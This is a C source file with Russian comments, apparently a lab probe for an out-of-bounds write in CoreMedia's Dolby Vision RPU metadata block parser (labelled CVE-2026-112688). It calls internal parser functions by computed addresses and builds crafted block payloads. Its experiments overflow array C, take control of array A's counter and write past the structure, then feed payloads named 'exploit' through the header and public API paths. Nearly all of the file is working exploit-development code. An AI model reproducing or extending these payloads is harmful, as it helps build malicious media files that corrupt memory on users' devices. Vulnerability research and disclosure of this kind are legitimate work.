// probe_rpu2.c — CVE-2026-112688 (CoreMedia DV-RPU metadata block arrays), 24A446.
//
// Лабораторная проба: зовём внутреннюю функцию напрямую по адресу, чтобы
// измерить ГРАММАТИКУ БЛОКОВ и факт переполнения, не реконструируя весь
// RPU-заголовок (он нужен отдельно, для достижимости из файла/демона).
//
//   _hevcbridgeParseVdrDmDataPayloadExMetadatatBlocks(reader, ctx, mode, out)
//     24A446: 0x18eed3198
//   слайд считаем от экспортируемого CMGetDMVersionLevelFromRPU (0x18efbf940).
//
// Грамматика блока (декомпиляция 24A446):
//   ue(size_bytes) | u(8) block_id | payload: size*8 бит
//   id 8  -> массив C: 5 записей по 0x24 от param_4+0x726c, счётчик +0x7268
//            (+0x7320 = начало 6-й записи = ЗА массивом)
//   id 10 -> массив A: 4 записи по 0x1c от param_4+0x733c, счётчик +0x7334;
//            индекс берётся из счётчика БЕЗ зажима.
//   id 0xfe -> пишет флаг +0x71cf и уровень +0x73ad (оракул разбора).
typedef unsigned long size_t;
#include "rpu_payloads.h"
typedef unsigned char u8;
typedef unsigned int u32;
typedef int i32;
typedef unsigned long long u64;

extern void *malloc(unsigned long);
extern void *realloc(void *, unsigned long);
extern void free(void *);
extern void *memset(void *, int, unsigned long);
extern char *getenv(const char *);
extern int open(const char *, int, ...);
extern long write(int, const void *, unsigned long);
extern int close(int);
extern void *dlopen(const char *, int);
extern void *dlsym(void *, const char *);

#define RTLD_NOW 2
#define O_WRONLY 0x0001
#define O_CREAT  0x0200
#define O_TRUNC  0x0400

static int g_fd = -1;

static void log_str(const char *s) { long n = 0; while (s[n]) n++; if (g_fd >= 0) write(g_fd, s, (unsigned long)n); }
static void log_dec(long v) {
    char b[24]; int i = 23; b[i] = 0;
    if (v < 0) { log_str("-"); v = -v; }
    if (v == 0) b[--i] = '0';
    while (v > 0) { b[--i] = (char)('0' + (v % 10)); v /= 10; }
    log_str(&b[i]);
}
static void log_hex(const char *tag, const u8 *p, int n) {
    static const char *hx = "0123456789abcdef";
    log_str(tag); log_str(": ");
    for (int i = 0; i < n; i++) { char b[3]; b[0] = hx[p[i] >> 4]; b[1] = hx[p[i] & 15]; b[2] = 0; log_str(b); }
    log_str("\n");
}

// ── MSB-first bit writer ──
typedef struct { u8 *d; size_t n, cap; u8 acc; int nbits; } bw;
static void bw_put(bw *w, u32 value, int width) {
    for (int i = width - 1; i >= 0; i--) {
        w->acc = (u8)((w->acc << 1) | ((value >> i) & 1));
        if (++w->nbits == 8) {
            if (w->n + 1 > w->cap) { w->cap = w->cap * 2 + 64; w->d = (u8 *)realloc(w->d, w->cap); }
            w->d[w->n++] = w->acc; w->acc = 0; w->nbits = 0;
        }
    }
}
static void bw_ue(bw *w, u32 value) {
    u32 v = value + 1; int bits = 0;
    while ((v >> bits) > 1) bits++;
    for (int i = 0; i < bits; i++) bw_put(w, 0, 1);
    bw_put(w, v, bits + 1);
}
static size_t bw_flush(bw *w) {
    if (w->nbits > 0) {
        if (w->n + 1 > w->cap) { w->cap = w->cap * 2 + 64; w->d = (u8 *)realloc(w->d, w->cap); }
        w->d[w->n++] = (u8)(w->acc << (8 - w->nbits));
        w->acc = 0; w->nbits = 0;
    }
    return w->n;
}

typedef i32 (*blocks_fn)(u64 *reader, void *ctx, int mode, void *out);

static void reader_init(u64 *r, const u8 *bytes, size_t len) {
    memset(r, 0, 0x58);
    r[0] = (u64)bytes;
    r[1] = (u64)len;
    r[3] = (u64)(unsigned long)(bytes + len);
    r[6] = (u64)bytes;
    r[7] = (u64)bytes;
}

static u8 *g_ctx, *g_mem;

// Лог-колбэк парсера: (ctx, tag, value, -1) -> rc
static i32 g_trace_n = 0;
static int g_trace_verbose = 0;

static i32 trace_cb(u64 ctxv, u32 tag, u32 val, i32 flag) {
    g_trace_n++;
    if (g_trace_verbose) {
        log_str("  T"); log_dec((long)tag); log_str("="); log_dec((long)val); log_str(" ");
    }
    return 0;
}

static void reset_mem(void) {
    memset(g_ctx, 0, 0x400);
    memset(g_mem, 0, 0x9000);
    for (int i = 0x73b4; i < 0x9000; i++) g_mem[i] = 0xAA;   // канарейка за структурой
}

// блок id 8: payload = u8 + 8 x u12 = 104 бита (size 13 байт)
static void block8(bw *w, u32 size, u32 first, u32 seed) {
    bw_ue(w, size);
    bw_put(w, 8, 8);
    bw_put(w, first, 8);                       // -> slot+4
    for (int k = 0; k < 8; k++) bw_put(w, seed + (u32)k, 12);  // slot+6..+0x14
}

static int call_blocks(blocks_fn f, u64 *r, int times, const char *tag) {
    for (int i = 0; i < times; i++) {
        i32 rc = f(r, g_ctx, 1, g_mem);
        log_str(tag); log_str(" call "); log_dec(i + 1);
        log_str(" rc="); log_dec(rc); log_str("\n");
        if (rc != 0) return i + 1;
    }
    return times;
}

static void dump(const char *tag) {
    log_str(tag); log_str("\n");
    for (int i = 0; i < 5; i++) {
        char lbl[32];
        int p = 0;
        const char *pre = "  C";
        while (*pre) lbl[p++] = *pre++;
        lbl[p++] = (char)('0' + i);
        lbl[p] = 0;
        log_hex(lbl, g_mem + 0x726c + i * 0x24, 0x24);
    }
    log_hex("  slot5  [0x7320]", g_mem + 0x7320, 0x24);
    log_hex("  Acount [0x7334]", g_mem + 0x7334, 8);
    for (int i = 0; i < 5; i++) {
        char lbl[32];
        int p = 0;
        const char *pre = "  A";
        while (*pre) lbl[p++] = *pre++;
        lbl[p++] = (char)('0' + i);
        lbl[p] = 0;
        log_hex(lbl, g_mem + 0x733c + i * 0x1c, 0x1c);
    }
    log_hex("  past   [0x73b4]", g_mem + 0x73b4, 0x40);
}

int main(void) {
    const char *home = getenv("HOME");
    char path[400]; int p = 0;
    if (home) { while (home[p] && p < 300) { path[p] = home[p]; p++; } }
    const char *sfx = "/Documents/probe_rpu2.log";
    for (int i = 0; sfx[i] && p < 390; i++) path[p++] = sfx[i];
    path[p] = 0;
    g_fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    log_str("rpu2: start\n");

    void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_NOW);
    void *gv = cm ? dlsym(cm, "CMGetDMVersionLevelFromRPU") : 0;
    log_str("rpu2: cm="); log_dec((long)(cm != 0));
    log_str(" getver="); log_dec((long)(gv != 0)); log_str("\n");
    if (!gv) { close(g_fd); return 1; }

    u64 slide = (u64)gv - 0x18efbf940ULL;
    blocks_fn blocks = (blocks_fn)(u64)(slide + 0x18eed3198ULL);
    log_str("rpu2: slide="); log_dec((long)slide);
    log_str(" blocks="); log_dec((long)(u64)blocks); log_str("\n");

    g_ctx = (u8 *)malloc(0x400);
    g_mem = (u8 *)malloc(0x9000);
    u64 r[0x58 / 8];
    if (!g_ctx || !g_mem) { log_str("rpu2: oom\n"); close(g_fd); return 1; }

    // ── E1: оракул — блок id 0xfe (size 2) должен дать flag=1, level=1
    {
        bw w = {0};
        bw_ue(&w, 2);
        bw_put(&w, 0xfe, 8);
        bw_put(&w, 0x00, 8);
        bw_put(&w, 0x01, 8);
        size_t n = bw_flush(&w);
        reset_mem();
        reader_init(r, w.d, n);
        log_hex("E1 payload", w.d, (int)n);
        i32 rc = blocks(r, g_ctx, 1, g_mem);
        log_str("E1 rc="); log_dec(rc);
        log_str(" flag[0x71cf]="); log_dec(g_mem[0x71cf]);
        log_str(" lvl[0x73ad]="); log_dec((char)g_mem[0x73ad]);
        log_str("\n");
        free(w.d);
    }

    // ── E2: один блок id 8 (size 13) — проверяем раскладку полей
    {
        bw w = {0};
        block8(&w, 13, 0x21, 0x300);
        size_t n = bw_flush(&w);
        reset_mem();
        reader_init(r, w.d, n);
        log_hex("E2 payload", w.d, (int)n);
        call_blocks(blocks, r, 1, "E2");
        dump("E2 state");
        free(w.d);
    }

    // ── E3: 6 x id 8 (size 13) — 6-я запись должна уйти в 0x7320
    {
        bw w = {0};
        for (int i = 0; i < 6; i++) block8(&w, 13, 0x20 + (u32)i, 0x100 * (u32)(i + 1));
        size_t n = bw_flush(&w);
        reset_mem();
        reader_init(r, w.d, n);
        log_hex("E3 payload", w.d, (int)n);
        call_blocks(blocks, r, 6, "E3");
        dump("E3 state");
        free(w.d);
    }

    // ── E4: размер 6-го блока id 8 варьируем — ищем вариант, где поле +0x16
    //        тоже наше (тогда счётчик A управляемый целиком)
    {
        const u32 sizes[5] = {14, 15, 19, 22, 23};
        for (int si = 0; si < 5; si++) {
            bw w = {0};
            for (int i = 0; i < 5; i++) block8(&w, 13, 0x20 + (u32)i, 0x100 * (u32)(i + 1));
            // 6-й блок: пишем «сырой» payload нужной длины с метками
            bw_ue(&w, sizes[si]);
            bw_put(&w, 8, 8);
            bw_put(&w, 0x2f, 8);
            for (int k = 0; k < 8; k++) bw_put(&w, 0xA0 + (u32)k, 12);
            for (int k = 0; k < 24; k++) bw_put(&w, 0xC0 + (u32)k, 8);
            size_t n = bw_flush(&w);
            reset_mem();
            reader_init(r, w.d, n);
            log_str("E4 size="); log_dec((long)sizes[si]);
            log_str(" bytes="); log_dec((long)n); log_str("\n");
            call_blocks(blocks, r, 6, "E4");
            dump("E4 state");
            free(w.d);
        }
    }

    // ── E5: 6-й блок id 8 с size 14 -> A_count = 5 (0x243=5, 0x244=0, 0x245=0),
    //        затем блок id 10 -> запись по param_4 + 0x733c + 5*0x1c = 0x73c8,
    //        то есть на 0x14 байт ЗА концом 0x73b4-структуры.
    {
        bw w = {0};
        for (int i = 0; i < 5; i++) block8(&w, 13, 0x20 + (u32)i, 0x100 * (u32)(i + 1));
        bw_ue(&w, 14);
        bw_put(&w, 8, 8);
        bw_put(&w, 0x2e, 8);
        for (int k = 0; k < 7; k++) bw_put(&w, 0xB0 + (u32)k, 12);
        bw_put(&w, 5, 12);          // 0x243 -> 0x7334 (A count, low 16)
        bw_put(&w, 0, 8);           // 0x244 -> 0x7336
        bw_put(&w, 0, 8);           // 0x245 -> 0x7337
        for (int k = 0; k < 4; k++) bw_put(&w, 0xD0 + (u32)k, 8);
        bw_ue(&w, 5);               // блок A: id 10, size 5
        bw_put(&w, 10, 8);
        bw_put(&w, 0x41, 8);
        bw_put(&w, 0x42, 12);
        bw_put(&w, 0x43, 12);
        bw_put(&w, 0x00, 8);
        size_t n = bw_flush(&w);
        reset_mem();
        reader_init(r, w.d, n);
        log_hex("E5 payload", w.d, (int)n);
        call_blocks(blocks, r, 7, "E5");
        dump("E5 state");
        free(w.d);
    }

    // ── E6/E7: настоящий путь через заголовок RPU.
    //     ParseDolbyRPUDataRBSP(reader, ctx, struct) @ 0x18efded24
    {
        typedef i32 (*rbsp_fn)(u64 *reader, void *ctx, void *out);
        rbsp_fn rbsp = (rbsp_fn)(slide + 0x18efded24ULL);
        log_str("E6: rbsp="); log_dec((long)(u64)rbsp); log_str("\n");

        struct { const u8 *p; u32 n; const char *tag; } cases[4] = {
            {rpu_v1_oracle, rpu_v1_oracle_len, "E6 oracle v1"},
            {rpu_v1_exploit, rpu_v1_exploit_len, "E7 exploit v1"},
            {rpu_v2_exploit, rpu_v2_exploit_len, "E7 exploit v2"},
            {rpu_v3_exploit, rpu_v3_exploit_len, "E7 exploit v3"},
        };
        for (int c = 0; c < 4; c++) {
            reset_mem();
            reader_init(r, cases[c].p, cases[c].n);
            i32 rc = rbsp(r, g_ctx, g_mem);
            log_str(cases[c].tag); log_str(" rc="); log_dec(rc);
            log_str(" flag="); log_dec(g_mem[0x71cf]);
            log_str(" lvl="); log_dec((char)g_mem[0x73ad]);
            log_str(" nblocks="); log_dec(g_mem[0x71c2]);
            log_str("\n");
            dump(cases[c].tag);
        }
    }

    // ── E9: трассировка полей заголовка через лог-колбэк парсера.
    //     Маска логов = u64 по ctx+0x2c; бит N включает тег 0x1be+N.
    //     Колбэк: ctx[0x10], аргументы (ctx[0], tag, value, -1).
    {
        typedef i32 (*rbsp_fn)(u64 *reader, void *ctx, void *out);
        rbsp_fn rbsp = (rbsp_fn)(slide + 0x18efded24ULL);
        u8 *tc = (u8 *)malloc(0x400);
        memset(tc, 0, 0x400);
        *(u64 *)(tc + 0x10) = (u64)(unsigned long)&trace_cb;
        *(u64 *)(tc + 0x2c) = 0xffffffffffffffffULL;

        for (int i = 0; i < rpu_matrix_len; i++) {
            reset_mem();
            reader_init(r, rpu_matrix[i].p, rpu_matrix[i].n);
            g_trace_n = 0;
            g_trace_verbose = (i == 0);
            i32 rc = rbsp(r, tc, g_mem);
            if (g_trace_verbose) log_str("\n");
            log_str("E9 "); log_str(rpu_matrix[i].name);
            log_str(" rc="); log_dec(rc);
            log_str(" flag="); log_dec(g_mem[0x71cf]);
            log_str(" lvl="); log_dec((char)g_mem[0x73ad]);
            log_str(" tags="); log_dec(g_trace_n);
            log_str("\n");
        }
        free(tc);
    }

    // ── E11: публичный путь — CMGetDMVersionLevelFromRPU(CFDataRef).
    //     Ожидание для oracle-пейлоада: level 1 -> возврат 3.
    {
        void *cf = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", RTLD_NOW);
        typedef const void *(*mk_t)(const void *, const u8 *, long);
        typedef void (*rel_t)(const void *);
        typedef i32 (*getver_t)(const void *);
        mk_t mk = (mk_t)dlsym(cf, "CFDataCreate");
        rel_t rel = (rel_t)dlsym(cf, "CFRelease");
        getver_t gv2 = (getver_t)dlsym(cm, "CMGetDMVersionLevelFromRPU");
        log_str("E11 syms="); log_dec((long)(mk != 0)); log_dec((long)(rel != 0));
        log_dec((long)(gv2 != 0)); log_str("\n");
        if (mk && rel && gv2) {
            struct { const u8 *p; u32 n; const char *tag; } cs[2] = {
                {rpu_v1_oracle, rpu_v1_oracle_len, "E11 oracle v1"},
                {rpu_v1_exploit, rpu_v1_exploit_len, "E11 exploit v1"},
            };
            for (int c = 0; c < 2; c++) {
                const void *d = mk(0, cs[c].p, (long)cs[c].n);
                i32 rc = d ? gv2(d) : -777;
                if (d) rel(d);
                log_str(cs[c].tag); log_str(" rc="); log_dec(rc); log_str("\n");
            }
        }
    }

    // ── E12: FigHEVCBridge_GetRPUMetadataFromRPU(bytes, len, out) @ 0x18efdec38
    //     — сам инициализирует reader и ctx, зовёт ParseDolbyRPUDataRBSP.
    //     Плюс варианты с паддингом (вдруг парсеру нужно больше бит).
    {
        typedef i32 (*fromrpu_fn)(const u8 *bytes, u64 len, void *out);
        fromrpu_fn fr = (fromrpu_fn)(slide + 0x18efdec38ULL);
        const u8 *src[8] = {rpu_v1_oracle, rpu_v1_exploit, rpu_probe6, rpu_probe7,
                            rpu_p1, rpu_m11_p1_denom1, rpu_v1_oracle, rpu_v1_oracle};
        u32 len[8] = {rpu_v1_oracle_len, rpu_v1_exploit_len, rpu_probe6_len, rpu_probe7_len,
                      rpu_p1_len, rpu_m11_p1_denom1_len, rpu_v1_oracle_len, rpu_v1_oracle_len};
        const char *nm[8] = {"E12 oracle v1", "E12 exploit v1", "E12 probe6", "E12 probe7",
                             "E12 pad1", "E12 m11", "", ""};
        for (int c = 0; c < 6; c++) {
            u32 n = len[c];
            u8 *buf = (u8 *)malloc(n);
            memset(buf, 0, n);
            for (u32 i = 0; i < len[c]; i++) buf[i] = src[c][i];
            reset_mem();
            i32 rc = fr(buf, (u64)n, g_mem);
            log_str(nm[c]);
            log_str(" rc="); log_dec(rc);
            log_str(" flag="); log_dec(g_mem[0x71cf]);
            log_str(" lvl="); log_dec((char)g_mem[0x73ad]);
            log_str(" nblocks="); log_dec(g_mem[0x71c2]);
            log_str("\n");
            dump(nm[c]);
            free(buf);
        }
    }

    // ── E13: те же пейлоады с хвостом из нулей (проверка «дотягивания» выравнивания)
    {
        typedef i32 (*fromrpu_fn)(const u8 *bytes, u64 len, void *out);
        fromrpu_fn fr = (fromrpu_fn)(slide + 0x18efdec38ULL);
        const u8 *src[2] = {rpu_v1_oracle, rpu_v1_exploit};
        u32 len[2] = {rpu_v1_oracle_len, rpu_v1_exploit_len};
        const char *nm[2] = {"E13 oracle+32z", "E13 exploit+32z"};
        for (int c = 0; c < 2; c++) {
            u32 n = len[c] + 32;
            u8 *buf = (u8 *)malloc(n);
            memset(buf, 0, n);
            for (u32 i = 0; i < len[c]; i++) buf[i] = src[c][i];
            reset_mem();
            i32 rc = fr(buf, (u64)n, g_mem);
            log_str(nm[c]); log_str(" rc="); log_dec(rc);
            log_str(" flag="); log_dec(g_mem[0x71cf]);
            log_str(" lvl="); log_dec((char)g_mem[0x73ad]);
            log_str(" nblocks="); log_dec(g_mem[0x71c2]);
            log_str(" past="); log_hex("", g_mem + 0x73b4 + 0x14, 8);
            log_str("\n");
            free(buf);
        }
    }

    log_str("rpu2: done\n");
    close(g_fd);
    return 0;
}
